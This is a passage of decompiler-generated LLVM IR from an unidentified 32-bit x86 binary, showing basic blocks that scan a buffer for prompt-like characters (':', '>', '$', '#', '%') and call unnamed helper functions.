  %v10_804e314 = icmp ne i8 %v5_804e310, 58
  %v10_804e319 = icmp eq i8 %v5_804e310, 62
  %v1_804e31c = icmp eq i1 %v10_804e319, false
  %or.cond165 = and i1 %v10_804e314, %v1_804e31c
  br i1 %or.cond165, label %dec_label_pc_804e2fa, label %dec_label_pc_804e31e

dec_label_pc_804e31e.thread:                      ; preds = %dec_label_pc_804e2ec, %dec_label_pc_804e2ec
  store i32 %v3_804e2e0, i32* @esi, align 4
  br label %dec_label_pc_804e32a

dec_label_pc_804e31e:                             ; preds = %dec_label_pc_804e2fa, %dec_label_pc_804e310
  %v0_804e31e = phi i32 [ %v1_804e309, %dec_label_pc_804e310 ], [ %v0_804e309, %dec_label_pc_804e2fa ]
  %v1_804e31e = add i32 %v0_804e31e, 1
  store i32 %v1_804e31e, i32* @esi, align 4
  %v10_804e321 = icmp eq i32 %v0_804e31e, -2
  br i1 %v10_804e321, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e32a

dec_label_pc_804e32a:                             ; preds = %dec_label_pc_804e31e.thread, %dec_label_pc_804e31e
  %v1_804e31e176 = phi i32 [ %v3_804e2e0, %dec_label_pc_804e31e.thread ], [ %v1_804e31e, %dec_label_pc_804e31e ]
  %tmp136 = icmp slt i32 %v1_804e31e176, 1
  br i1 %tmp136, label %dec_label_pc_804e729, label %dec_label_pc_804e332

dec_label_pc_804e332:                             ; preds = %dec_label_pc_804e32a
  %v0_804e332 = load i32, i32* @esp, align 4
  %v1_804e335 = add i32 %v0_804e332, -16
  %v2_804e335 = inttoptr i32 %v1_804e335 to i32*
  store i32 6, i32* %v2_804e335, align 4
  %v0_804e337 = call i32 @function_804edf0()
  store i32 %v0_804e337, i32* %eax.global-to-local, align 4
  %v0_804e33c = load i32, i32* @esp, align 4
  %v1_804e33c = inttoptr i32 %v0_804e33c to i32*
  %v2_804e33c = load i32, i32* %v1_804e33c, align 4
  store i32 %v2_804e33c, i32* %eax.global-to-local, align 4
  %v3_804e33c = add i32 %v0_804e33c, 4
  %v1_804e33d = inttoptr i32 %v3_804e33c to i32*
  %v2_804e33d = load i32, i32* %v1_804e33d, align 4
  store i32 %v2_804e33d, i32* %edx.global-to-local, align 4
  %v1_804e33e = add i32 %v0_804e33c, 1872
  store i32 %v1_804e33e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e33e, i32* %v1_804e33d, align 4
  store i32 6, i32* %v1_804e33c, align 4
  %v0_804e348 = call i32 @function_804ed40()
  store i32 %v0_804e348, i32* %eax.global-to-local, align 4
  %v0_804e34d = load i32, i32* @esp, align 4
  %v1_804e34d = add i32 %v0_804e34d, -4
  %v2_804e34d = inttoptr i32 %v1_804e34d to i32*
  store i32 16384, i32* %v2_804e34d, align 4
  %v1_804e352 = add i32 %v0_804e34d, 1872
  %v2_804e352 = inttoptr i32 %v1_804e352 to i32*
  %v3_804e352 = load i32, i32* %v2_804e352, align 4
  %v2_804e359 = add i32 %v0_804e34d, -8
  %v3_804e359 = inttoptr i32 %v2_804e359 to i32*
  store i32 %v3_804e352, i32* %v3_804e359, align 4
  %v2_804e35a = add i32 %v0_804e34d, -12
  %v3_804e35a = inttoptr i32 %v2_804e35a to i32*
  store i32 %v0_804e348, i32* %v3_804e35a, align 4
  %v0_804e35b = load i32, i32* @edi, align 4
  %v1_804e35b = add i32 %v0_804e35b, 4
  %v2_804e35b = inttoptr i32 %v1_804e35b to i32*
  %v3_804e35b = load i32, i32* %v2_804e35b, align 4
  store i32 %v3_804e35b, i32* @ebx, align 4
  %v2_804e35e = add i32 %v0_804e34d, -16
  %v3_804e35e = inttoptr i32 %v2_804e35e to i32*
  store i32 %v3_804e35b, i32* %v3_804e35e, align 4
  %v0_804e35f = call i32 @function_804fff3()
  store i32 %v0_804e35f, i32* %eax.global-to-local, align 4
  %v0_804e364 = load i32, i32* @esp, align 4
  %v1_804e367 = add i32 %v0_804e364, 28
  %v2_804e367 = inttoptr i32 %v1_804e367 to i32*
  store i32 16384, i32* %v2_804e367, align 4
  %v1_804e36c = add i32 %v0_804e364, 24
  %v2_804e36c = inttoptr i32 %v1_804e36c to i32*
  store i32 2, i32* %v2_804e36c, align 4
  %v1_804e36e = add i32 %v0_804e364, 20
  %v2_804e36e = inttoptr i32 %v1_804e36e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804e36e, align 4
  %v0_804e373 = load i32, i32* @edi, align 4
  %v1_804e373 = add i32 %v0_804e373, 4
  %v2_804e373 = inttoptr i32 %v1_804e373 to i32*
  %v3_804e373 = load i32, i32* %v2_804e373, align 4
  store i32 %v3_804e373, i32* %ecx.global-to-local, align 4
  %v2_804e376 = add i32 %v0_804e364, 16
  %v3_804e376 = inttoptr i32 %v2_804e376 to i32*
  store i32 %v3_804e373, i32* %v3_804e376, align 4
  %v0_804e377 = call i32 @function_804fff3()
  store i32 %v0_804e377, i32* %eax.global-to-local, align 4
  %v0_804e37c = load i32, i32* @esp, align 4
  %v1_804e37c = inttoptr i32 %v0_804e37c to i32*
  store i32 6, i32* %v1_804e37c, align 4
  %v0_804e383 = call i32 @function_804ed70()
  store i32 %v0_804e383, i32* %eax.global-to-local, align 4
  %v0_804e38b = load i32, i32* @edi, align 4
  %v1_804e38b = add i32 %v0_804e38b, 12
  %v2_804e38b = inttoptr i32 %v1_804e38b to i32*
  store i32 7, i32* %v2_804e38b, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e127
  %v0_804e397 = load i32, i32* @esp, align 4
  %v1_804e39a = add i32 %v0_804e397, -16
  %v2_804e39a = inttoptr i32 %v1_804e39a to i32*
  store i32 10, i32* %v2_804e39a, align 4
  %v0_804e39c = call i32 @function_804edf0()
  store i32 %v0_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* @esp, align 4
  %v1_804e3a1 = inttoptr i32 %v0_804e3a1 to i32*
  %v2_804e3a1 = load i32, i32* %v1_804e3a1, align 4
  store i32 %v2_804e3a1, i32* %eax.global-to-local, align 4
  %v3_804e3a1 = add i32 %v0_804e3a1, 4
  %v1_804e3a2 = inttoptr i32 %v3_804e3a1 to i32*
  %v2_804e3a2 = load i32, i32* %v1_804e3a2, align 4
  store i32 %v2_804e3a2, i32* %edx.global-to-local, align 4
  %v1_804e3a3 = add i32 %v0_804e3a1, 1864
  store i32 %v1_804e3a3, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e3a3, i32* %v1_804e3a2, align 4
  store i32 10, i32* %v1_804e3a1, align 4
  %v0_804e3ad = call i32 @function_804ed40()
  store i32 %v0_804e3ad, i32* %eax.global-to-local, align 4
  %v0_804e3b2 = load i32, i32* @esp, align 4
  %v1_804e3b2 = add i32 %v0_804e3b2, 1864
  %v2_804e3b2 = inttoptr i32 %v1_804e3b2 to i32*
  %v3_804e3b2 = load i32, i32* %v2_804e3b2, align 4
  %v1_804e3b9 = add i32 %v3_804e3b2, -1
  store i32 %v1_804e3b9, i32* %edx.global-to-local, align 4
  %v2_804e3ba = add i32 %v0_804e3b2, -4
  %v3_804e3ba = inttoptr i32 %v2_804e3ba to i32*
  store i32 %v1_804e3b9, i32* %v3_804e3ba, align 4
  %v2_804e3bb = add i32 %v0_804e3b2, -8
  %v3_804e3bb = inttoptr i32 %v2_804e3bb to i32*
  store i32 %v0_804e3ad, i32* %v3_804e3bb, align 4
  %v0_804e3bc = load i32, i32* @edi, align 4
  %v1_804e3bc = add i32 %v0_804e3bc, 24
  %v2_804e3bc = inttoptr i32 %v1_804e3bc to i32*
  %v3_804e3bc = load i32, i32* %v2_804e3bc, align 4
  store i32 %v3_804e3bc, i32* %eax.global-to-local, align 4
  %v2_804e3bf = add i32 %v0_804e3b2, -12
  %v3_804e3bf = inttoptr i32 %v2_804e3bf to i32*
  store i32 %v3_804e3bc, i32* %v3_804e3bf, align 4
  %v1_804e3c0 = add i32 %v0_804e3b2, 24
  %v2_804e3c0 = inttoptr i32 %v1_804e3c0 to i32*
  %v3_804e3c0 = load i32, i32* %v2_804e3c0, align 4
  store i32 %v3_804e3c0, i32* %eax.global-to-local, align 4
  %v2_804e3c4 = add i32 %v0_804e3b2, -16
  %v3_804e3c4 = inttoptr i32 %v2_804e3c4 to i32*
  store i32 %v3_804e3c0, i32* %v3_804e3c4, align 4
  %v0_804e3c5 = call i32 @function_804f470()
  %v0_804e3ca = load i32, i32* @esp, align 4
  %v1_804e3cd = add i32 %v0_804e3c5, 1
  %v8_804e3cd = icmp eq i32 %v1_804e3cd, 0
  store i32 %v1_804e3cd, i32* %eax.global-to-local, align 4
  %v1_804e8d0 = add i32 %v0_804e3ca, 16
  %v2_804e8d0 = inttoptr i32 %v1_804e8d0 to i32*
  store i32 10, i32* %v2_804e8d0, align 4
  %v0_804e8d2 = call i32 @function_804ed70()
  store i32 %v0_804e8d2, i32* %eax.global-to-local, align 4
  %v0_804e8d7 = load i32, i32* @esp, align 4
  %v1_804e8d7 = inttoptr i32 %v0_804e8d7 to i32*
  br i1 %v8_804e3cd, label %dec_label_pc_804e8cd, label %dec_label_pc_804e3d4

dec_label_pc_804e3d4:                             ; preds = %dec_label_pc_804e397
  %v2_804e3de = load i32, i32* %v1_804e8d7, align 4
  store i32 %v2_804e3de, i32* %eax.global-to-local, align 4
  %v0_804e3df = load i32, i32* @edi, align 4
  %v1_804e3df = add i32 %v0_804e3df, 4
  %v2_804e3df = inttoptr i32 %v1_804e3df to i32*
  %v3_804e3df = load i32, i32* %v2_804e3df, align 4
  store i32 %v3_804e3df, i32* %eax.global-to-local, align 4
  store i32 %v3_804e3df, i32* %v1_804e8d7, align 4
  %v1_804e3e3 = call i32 @function_804f8e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e3e3, i32* %eax.global-to-local, align 4
  %v0_804e3e8 = load i32, i32* @edi, align 4
  %v1_804e3e8 = add i32 %v0_804e3e8, 284
  %v2_804e3e8 = inttoptr i32 %v1_804e3e8 to i8*
  %v3_804e3e8 = load i8, i8* %v2_804e3e8, align 1
  %v4_804e3e8 = zext i8 %v3_804e3e8 to i32
  %v6_804e3e8 = and i32 %v1_804e3e3, -256
  %v7_804e3e8 = or i32 %v4_804e3e8, %v6_804e3e8
  %v1_804e3f1 = add i32 %v7_804e3e8, 1
  store i32 %v1_804e3f1, i32* %eax.global-to-local, align 4
  %v1_804e3f2 = add i32 %v0_804e3e8, 4
  %v2_804e3f2 = inttoptr i32 %v1_804e3f2 to i32*
  store i32 -1, i32* %v2_804e3f2, align 4
  %v0_804e3f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e3f9 = trunc i32 %v0_804e3f9 to i8
  %v2_804e3f9 = load i32, i32* @edi, align 4
  %v3_804e3f9 = add i32 %v2_804e3f9, 284
  %v4_804e3f9 = inttoptr i32 %v3_804e3f9 to i8*
  store i8 %v1_804e3f9, i8* %v4_804e3f9, align 1
  %v0_804e3ff = load i32, i32* %eax.global-to-local, align 4
  %v1_804e3ff = trunc i32 %v0_804e3ff to i8
  %v10_804e3ff = icmp eq i8 %v1_804e3ff, 10
  %v1_804e401 = icmp eq i1 %v10_804e3ff, false
  %v0_804ec8d = load i32, i32* @edi, align 4
  br i1 %v1_804e401, label %dec_label_pc_804ec8d, label %dec_label_pc_804e407

dec_label_pc_804e407:                             ; preds = %dec_label_pc_804e3d4
  %v1_804e407 = add i32 %v0_804ec8d, 284
  %v2_804e407 = inttoptr i32 %v1_804e407 to i8*
  store i8 0, i8* %v2_804e407, align 1
  %v0_804e40e = load i32, i32* @edi, align 4
  %v1_804e40e = add i32 %v0_804e40e, 12
  %v2_804e40e = inttoptr i32 %v1_804e40e to i32*
  store i32 0, i32* %v2_804e40e, align 4
  store i32 -1, i32* @esi, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e418:                             ; preds = %dec_label_pc_804e729, %dec_label_pc_804e4da, %dec_label_pc_804ea11, %dec_label_pc_804ec8d, %dec_label_pc_804e950, %dec_label_pc_804e332, %dec_label_pc_804e746, %dec_label_pc_804e998, %dec_label_pc_804e6eb, %dec_label_pc_804e875, %dec_label_pc_804e1be, %dec_label_pc_804e407
  %v0_804e418 = load i32, i32* @edi, align 4
  %v1_804e418 = add i32 %v0_804e418, 24
  %v2_804e418 = inttoptr i32 %v1_804e418 to i32*
  %v3_804e418 = load i32, i32* %v2_804e418, align 4
  store i32 %v3_804e418, i32* %edx.global-to-local, align 4
  store i32 %v3_804e418, i32* %eax.global-to-local, align 4
  %v1_804e41d = load i32, i32* @esi, align 4
  %v2_804e41d = sub i32 %v3_804e418, %v1_804e41d
  %v8_804e41d = xor i32 %v1_804e41d, %v3_804e418
  %v9_804e41d = xor i32 %v2_804e41d, %v3_804e418
  %v10_804e41d = and i32 %v9_804e41d, %v8_804e41d
  %v11_804e41d = icmp slt i32 %v10_804e41d, 0
  %v12_804e41d = icmp eq i32 %v2_804e41d, 0
  %v13_804e41d = icmp slt i32 %v2_804e41d, 0
  %v3_804e41f = icmp ne i1 %v13_804e41d, %v11_804e41d
  %v4_804e41f = or i1 %v12_804e41d, %v3_804e41f
  br i1 %v4_804e41f, label %dec_label_pc_804e423, label %dec_label_pc_804e421

dec_label_pc_804e421:                             ; preds = %dec_label_pc_804e418
  store i32 %v1_804e41d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e423

dec_label_pc_804e423:                             ; preds = %dec_label_pc_804e418, %dec_label_pc_804e421
  %v1_804e423 = phi i32 [ %v3_804e418, %dec_label_pc_804e418 ], [ %v1_804e41d, %dec_label_pc_804e421 ]
  %v2_804e423 = sub i32 %v3_804e418, %v1_804e423
  store i32 %v2_804e423, i32* %eax.global-to-local, align 4
  store i32 %v2_804e423, i32* %v2_804e418, align 4
  %v0_804e428 = load i32, i32* @ebx, align 4
  %v1_804e428 = load i32, i32* @esp, align 4
  %v2_804e428 = add i32 %v1_804e428, -4
  %v3_804e428 = inttoptr i32 %v2_804e428 to i32*
  store i32 %v0_804e428, i32* %v3_804e428, align 4
  %v0_804e429 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e429 = add i32 %v1_804e428, -8
  %v3_804e429 = inttoptr i32 %v2_804e429 to i32*
  store i32 %v0_804e429, i32* %v3_804e429, align 4
  %v1_804e42a = add i32 %v1_804e428, 8
  %v2_804e42a = inttoptr i32 %v1_804e42a to i32*
  %v3_804e42a = load i32, i32* %v2_804e42a, align 4
  %v1_804e42e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e42e = add i32 %v1_804e42e, %v3_804e42a
  store i32 %v2_804e42e, i32* %eax.global-to-local, align 4
  %v2_804e430 = add i32 %v1_804e428, -12
  %v3_804e430 = inttoptr i32 %v2_804e430 to i32*
  store i32 %v2_804e42e, i32* %v3_804e430, align 4
  %v3_804e431 = load i32, i32* %v2_804e42a, align 4
  store i32 %v3_804e431, i32* %ecx.global-to-local, align 4
  %v2_804e435 = add i32 %v1_804e428, -16
  %v3_804e435 = inttoptr i32 %v2_804e435 to i32*
  store i32 %v3_804e431, i32* %v3_804e435, align 4
  %v4_804e436 = call i32 @function_804fe45(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e436, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e127

dec_label_pc_804e443:                             ; preds = %dec_label_pc_804e127
  %v1_804e443 = add i32 %v0_804e127, 24
  %v2_804e443 = inttoptr i32 %v1_804e443 to i32*
  %v3_804e443 = load i32, i32* %v2_804e443, align 4
  %v1_804e446 = add i32 %v3_804e443, -1
  store i32 %v1_804e446, i32* %eax.global-to-local, align 4
  %tmp137 = icmp slt i32 %v1_804e446, 1
  br i1 %tmp137, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e44f.preheader

dec_label_pc_804e44f.preheader:                   ; preds = %dec_label_pc_804e443
  %v7_804e44f.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e44f = add i32 %v0_804e127, 28
  br label %dec_label_pc_804e44f

dec_label_pc_804e44f:                             ; preds = %dec_label_pc_804e44f.preheader, %dec_label_pc_804e480
  %v7_804e44f = phi i32 [ %v7_804e44f.pre, %dec_label_pc_804e44f.preheader ], [ %v9_804e44f, %dec_label_pc_804e480 ]
  %v0_804e9fd = phi i32 [ %v1_804e446, %dec_label_pc_804e44f.preheader ], [ %v1_804e480, %dec_label_pc_804e480 ]
  %v3_804e44f = add i32 %v2_804e44f, %v0_804e9fd
  %v4_804e44f = inttoptr i32 %v3_804e44f to i8*
  %v5_804e44f = load i8, i8* %v4_804e44f, align 1
  %v6_804e44f = zext i8 %v5_804e44f to i32
  %v8_804e44f = and i32 %v7_804e44f, -256
  %v9_804e44f = or i32 %v6_804e44f, %v8_804e44f
  store i32 %v9_804e44f, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e44f, label %dec_label_pc_804e480 [
    i8 58, label %dec_label_pc_804e9fd
    i8 62, label %dec_label_pc_804e9fd
    i8 36, label %dec_label_pc_804e9fd
    i8 35, label %dec_label_pc_804e9fd
    i8 37, label %dec_label_pc_804e9fd
  ]

dec_label_pc_804e480:                             ; preds = %dec_label_pc_804e44f
  %v1_804e480 = add i32 %v0_804e9fd, -1
  %v8_804e480 = icmp eq i32 %v1_804e480, 0
  store i32 %v1_804e480, i32* %eax.global-to-local, align 4
  %v1_804e481 = icmp eq i1 %v8_804e480, false
  br i1 %v1_804e481, label %dec_label_pc_804e44f, label %dec_label_pc_804e0b5.backedge

dec_label_pc_804e488:                             ; preds = %dec_label_pc_804e127
  %v1_804e488 = add i32 %v0_804e127, 24
  %v2_804e488 = inttoptr i32 %v1_804e488 to i32*
  %v3_804e488 = load i32, i32* %v2_804e488, align 4
  %v1_804e48b = add i32 %v3_804e488, -1
  store i32 %v1_804e48b, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v1_804e48b, 1
  br i1 %tmp138, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e494

dec_label_pc_804e494:                             ; preds = %dec_label_pc_804e488
  %v2_804e494 = add i32 %v0_804e127, 27
  %v3_804e494 = add i32 %v2_804e494, %v3_804e488
  %v4_804e494 = inttoptr i32 %v3_804e494 to i8*
  %v5_804e494 = load i8, i8* %v4_804e494, align 1
  %v6_804e494 = zext i8 %v5_804e494 to i32
  %v7_804e494 = load i32, i32* %edx.global-to-local, align 4
  %v8_804e494 = and i32 %v7_804e494, -256
  %v9_804e494 = or i32 %v8_804e494, %v6_804e494
  store i32 %v9_804e494, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e494, label %dec_label_pc_804e4a2 [
    i8 62, label %dec_label_pc_804e4c6.thread
    i8 58, label %dec_label_pc_804e4c6.thread
  ]

dec_label_pc_804e4a2:                             ; preds = %dec_label_pc_804e494, %dec_label_pc_804e4b8
  %v0_804e4b1 = phi i32 [ %v1_804e4b1, %dec_label_pc_804e4b8 ], [ %v1_804e48b, %dec_label_pc_804e494 ]
  %v7_804e4b8 = phi i32 [ %v9_804e4b8, %dec_label_pc_804e4b8 ], [ %v9_804e494, %dec_label_pc_804e494 ]
  %v1_804e4a2 = trunc i32 %v7_804e4b8 to i8
  %v1_804e4a2.off = add i8 %v1_804e4a2, -35
  %switch168 = icmp ult i8 %v1_804e4a2.off, 3
  br i1 %switch168, label %dec_label_pc_804e4c6, label %dec_label_pc_804e4b1

dec_label_pc_804e4b1:                             ; preds = %dec_label_pc_804e4a2
  %v1_804e4b1 = add i32 %v0_804e4b1, -1
  %v8_804e4b1 = icmp eq i32 %v1_804e4b1, 0
  store i32 %v1_804e4b1, i32* %eax.global-to-local, align 4
  br i1 %v8_804e4b1, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e4b8

dec_label_pc_804e4b8:                             ; preds = %dec_label_pc_804e4b1
  %v3_804e4b8 = add i32 %v2_804e494, %v0_804e4b1
  %v4_804e4b8 = inttoptr i32 %v3_804e4b8 to i8*
  %v5_804e4b8 = load i8, i8* %v4_804e4b8, align 1
  %v6_804e4b8 = zext i8 %v5_804e4b8 to i32
  %v8_804e4b8 = and i32 %v7_804e4b8, -256
  %v9_804e4b8 = or i32 %v6_804e4b8, %v8_804e4b8
  store i32 %v9_804e4b8, i32* %edx.global-to-local, align 4
  %v10_804e4bc = icmp ne i8 %v5_804e4b8, 58
  %v10_804e4c1 = icmp eq i8 %v5_804e4b8, 62
  %v1_804e4c4 = icmp eq i1 %v10_804e4c1, false
  %or.cond166 = and i1 %v10_804e4bc, %v1_804e4c4
  br i1 %or.cond166, label %dec_label_pc_804e4a2, label %dec_label_pc_804e4c6

dec_label_pc_804e4c6.thread:                      ; preds = %dec_label_pc_804e494, %dec_label_pc_804e494
  store i32 %v3_804e488, i32* @esi, align 4
  br label %dec_label_pc_804e4d2

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e4a2, %dec_label_pc_804e4b8
  %v0_804e4c6 = phi i32 [ %v1_804e4b1, %dec_label_pc_804e4b8 ], [ %v0_804e4b1, %dec_label_pc_804e4a2 ]
  %v1_804e4c6 = add i32 %v0_804e4c6, 1
  store i32 %v1_804e4c6, i32* @esi, align 4
  %v10_804e4c9 = icmp eq i32 %v0_804e4c6, -2
  br i1 %v10_804e4c9, label %dec_label_pc_804e0b5.backedge, label %dec_label_pc_804e4d2

dec_label_pc_804e4d2:                             ; preds = %dec_label_pc_804e4c6.thread, %dec_label_pc_804e4c6
  %v1_804e4c6179 = phi i32 [ %v3_804e488, %dec_label_pc_804e4c6.thread ], [ %v1_804e4c6, %dec_label_pc_804e4c6 ]
  %tmp139 = icmp slt i32 %v1_804e4c6179, 1
  br i1 %tmp139, label %dec_label_pc_804e729, label %dec_label_pc_804e4da

dec_label_pc_804e4da:                             ; preds = %dec_label_pc_804e4d2
  %v0_804e4da = load i32, i32* @esp, align 4
  %v1_804e4dd = add i32 %v0_804e4da, -16
  %v2_804e4dd = inttoptr i32 %v1_804e4dd to i32*
  store i32 8, i32* %v2_804e4dd, align 4
  %v0_804e4df = call i32 @function_804edf0()
  store i32 %v0_804e4df, i32* %eax.global-to-local, align 4
  %v0_804e4e4 = load i32, i32* @esp, align 4
  %v1_804e4e4 = inttoptr i32 %v0_804e4e4 to i32*
  %v2_804e4e4 = load i32, i32* %v1_804e4e4, align 4
  store i32 %v2_804e4e4, i32* %eax.global-to-local, align 4
  %v3_804e4e4 = add i32 %v0_804e4e4, 4
  %v1_804e4e5 = inttoptr i32 %v3_804e4e4 to i32*
  %v1_804e4e6 = add i32 %v0_804e4e4, 1864
  store i32 %v1_804e4e6, i32* %edx.global-to-local, align 4
  store i32 %v1_804e4e6, i32* %v1_804e4e5, align 4
  store i32 8, i32* %v1_804e4e4, align 4
  %v0_804e4f0 = call i32 @function_804ed40()
  store i32 %v0_804e4f0, i32* %eax.global-to-local, align 4
  %v0_804e4f5 = load i32, i32* @esp, align 4
  %v1_804e4f5 = add i32 %v0_804e4f5, -4
  %v2_804e4f5 = inttoptr i32 %v1_804e4f5 to i32*
  store i32 16384, i32* %v2_804e4f5, align 4
  %v1_804e4fa = add i32 %v0_804e4f5, 1864
  %v2_804e4fa = inttoptr i32 %v1_804e4fa to i32*
  %v3_804e4fa = load i32, i32* %v2_804e4fa, align 4
  %v2_804e501 = add i32 %v0_804e4f5, -8
  %v3_804e501 = inttoptr i32 %v2_804e501 to i32*
  store i32 %v3_804e4fa, i32* %v3_804e501, align 4
  %v2_804e502 = add i32 %v0_804e4f5, -12
  %v3_804e502 = inttoptr i32 %v2_804e502 to i32*
  store i32 %v0_804e4f0, i32* %v3_804e502, align 4
  %v0_804e503 = load i32, i32* @edi, align 4
  %v1_804e503 = add i32 %v0_804e503, 4
  %v2_804e503 = inttoptr i32 %v1_804e503 to i32*
  %v3_804e503 = load i32, i32* %v2_804e503, align 4
  store i32 %v3_804e503, i32* @ebx, align 4
  %v2_804e506 = add i32 %v0_804e4f5, -16
  %v3_804e506 = inttoptr i32 %v2_804e506 to i32*
  store i32 %v3_804e503, i32* %v3_804e506, align 4
  %v0_804e507 = call i32 @function_804fff3()
  store i32 %v0_804e507, i32* %eax.global-to-local, align 4
  %v0_804e50c = load i32, i32* @esp, align 4
  %v1_804e50f = add i32 %v0_804e50c, 28
  %v2_804e50f = inttoptr i32 %v1_804e50f to i32*
  store i32 16384, i32* %v2_804e50f, align 4
  %v1_804e514 = add i32 %v0_804e50c, 24
  %v2_804e514 = inttoptr i32 %v1_804e514 to i32*
  store i32 2, i32* %v2_804e514, align 4
  %v1_804e516 = add i32 %v0_804e50c, 20
  %v2_804e516 = inttoptr i32 %v1_804e516 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052219.22 to i32), i32* %v2_804e516, align 4
  %v0_804e51b = load i32, i32* @edi, align 4
  %v1_804e51b = add i32 %v0_804e51b, 4
  %v2_804e51b = inttoptr i32 %v1_804e51b to i32*
  %v3_804e51b = load i32, i32* %v2_804e51b, align 4
  store i32 %v3_804e51b, i32* %ecx.global-to-local, align 4
  %v2_804e51e = add i32 %v0_804e50c, 16
  %v3_804e51e = inttoptr i32 %v2_804e51e to i32*
  store i32 %v3_804e51b, i32* %v3_804e51e, align 4
  %v0_804e51f = call i32 @function_804fff3()
  store i32 %v0_804e51f, i32* %eax.global-to-local, align 4
  %v0_804e524 = load i32, i32* @esp, align 4
  %v1_804e524 = inttoptr i32 %v0_804e524 to i32*
  store i32 8, i32* %v1_804e524, align 4
  %v0_804e52b = call i32 @function_804ed70()
  store i32 %v0_804e52b, i32* %eax.global-to-local, align 4
  %v0_804e533 = load i32, i32* @edi, align 4
  %v1_804e533 = add i32 %v0_804e533, 12
  %v2_804e533 = inttoptr i32 %v1_804e533 to i32*
  store i32 10, i32* %v2_804e533, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e53f:                             ; preds = %dec_label_pc_804e156
  %v1_804e53f = add i32 %v0_804e144, 2
  store i32 %v1_804e53f, i32* @ebx, align 4
  %v1_804e542 = add i32 %v0_804e542, 2
  store i32 %v1_804e542, i32* @esi, align 4
  br label %dec_label_pc_804e140.backedge

dec_label_pc_804e140.backedge:                    ; preds = %dec_label_pc_804e53f, %dec_label_pc_804ec3a
  %v0_804e1be120 = phi i32 [ %v0_804e1be121, %dec_label_pc_804e53f ], [ %v0_804ec73, %dec_label_pc_804ec3a ]
  %v1_804e140 = phi i32 [ %v1_804e150, %dec_label_pc_804e53f ], [ %v3_804ec73, %dec_label_pc_804ec3a ]
  %v0_804e140 = phi i32 [ %v1_804e542, %dec_label_pc_804e53f ], [ %v0_804e140.pre, %dec_label_pc_804ec3a ]
  %v5_804e156109 = phi i32 [ %v7_804e156, %dec_label_pc_804e53f ], [ %v0_804ec6b, %dec_label_pc_804ec3a ]
  %v0_804e149104 = phi i32 [ %v0_804e5b8, %dec_label_pc_804e53f ], [ %v1_804ec70, %dec_label_pc_804ec3a ]
  %v2_804e140 = sub i32 %v0_804e140, %v1_804e140
  %v8_804e140 = xor i32 %v0_804e140, %v1_804e140
  %v9_804e140 = xor i32 %v2_804e140, %v0_804e140
  %v10_804e140 = and i32 %v9_804e140, %v8_804e140
  %v11_804e140 = icmp slt i32 %v10_804e140, 0
  %v13_804e140 = icmp slt i32 %v2_804e140, 0
  %v2_804e142 = icmp eq i1 %v13_804e140, %v11_804e140
  br i1 %v2_804e142, label %dec_label_pc_804e1b6, label %dec_label_pc_804e144.preheader

dec_label_pc_804e54a:                             ; preds = %dec_label_pc_804e182
  store i8 -4, i8* %v2_804e182, align 1
  br label %dec_label_pc_804e195

dec_label_pc_804e553:                             ; preds = %dec_label_pc_804e0d0
  %v1_804e0fd = icmp eq i32 %v0_804e0f5, 0
  br i1 %v1_804e0fd, label %dec_label_pc_804ec0f, label %dec_label_pc_804e559

dec_label_pc_804e559:                             ; preds = %dec_label_pc_804e553
  %v10_804e559 = icmp eq i32 %v0_804e0f5, -1
  %v1_804e55c = icmp eq i1 %v10_804e559, false
  br i1 %v1_804e55c, label %dec_label_pc_804e117, label %dec_label_pc_804e562

dec_label_pc_804e562:                             ; preds = %dec_label_pc_804e559
  %v1_804e562 = add i32 %v0_804e0fa, 40
  %v2_804e562 = inttoptr i32 %v1_804e562 to i32*
  %v3_804e562 = load i32, i32* %v2_804e562, align 4
  store i32 %v3_804e562, i32* %edx.global-to-local, align 4
  %v1_804e566 = inttoptr i32 %v3_804e562 to i32*
  %v2_804e566 = load i32, i32* %v1_804e566, align 4
  %v11_804e566 = icmp eq i32 %v2_804e566, 11
  br i1 %v11_804e566, label %dec_label_pc_804e052, label %dec_label_pc_804e56f

dec_label_pc_804e56f:                             ; preds = %dec_label_pc_804e562, %dec_label_pc_804ec0f
  %v0_804e56f = phi i32 [ %v1_804e0fa, %dec_label_pc_804e562 ], [ %v0_804e56f.pre, %dec_label_pc_804ec0f ]
  %v0_804e572 = load i32, i32* @edi, align 4
  %v1_804e572 = add i32 %v0_804e572, 4
  %v2_804e572 = inttoptr i32 %v1_804e572 to i32*
  %v3_804e572 = load i32, i32* %v2_804e572, align 4
  store i32 %v3_804e572, i32* %ecx.global-to-local, align 4
  %v2_804e575 = add i32 %v0_804e56f, -16
  %v3_804e575 = inttoptr i32 %v2_804e575 to i32*
  store i32 %v3_804e572, i32* %v3_804e575, align 4
  %v1_804e576 = call i32 @function_804f8e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e576, i32* %eax.global-to-local, align 4
  %v0_804e57b = load i32, i32* @edi, align 4
  %v1_804e57b = add i32 %v0_804e57b, 284
  %v2_804e57b = inttoptr i32 %v1_804e57b to i8*
  %v3_804e57b = load i8, i8* %v2_804e57b, align 1
  %v4_804e57b = zext i8 %v3_804e57b to i32
